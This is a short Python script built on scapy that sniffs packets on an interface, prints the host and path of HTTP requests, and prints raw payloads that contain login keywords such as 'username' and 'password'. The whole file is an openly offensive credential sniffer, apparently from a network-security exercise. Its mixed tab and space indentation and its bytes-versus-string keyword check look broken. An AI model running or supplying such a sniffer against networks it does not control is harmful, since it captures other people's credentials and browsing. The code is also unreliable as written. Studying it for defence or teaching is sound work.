import scapy.all as sp
from scapy.layers import http


def sniff(interface):
	print("sniffing1")
	sp.sniff(iface=interface,store=False,prn=process_sniffed_packets)
	print("sniffing2")
def process_sniffed_packets(packet):
	
    	if packet.haslayer(http.HTTPRequest):
    		print("sniffing3")
        	url=packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        	#print(packet.show())
        	print(url)
            

        
	if packet.haslayer(sp.Raw):
            load = packet[sp.Raw].load
            keywords = ["username","user","login","password","pass"]
            for key in keywords:
                if key in load:
                    print(load)
                    break


sniff('eth0')
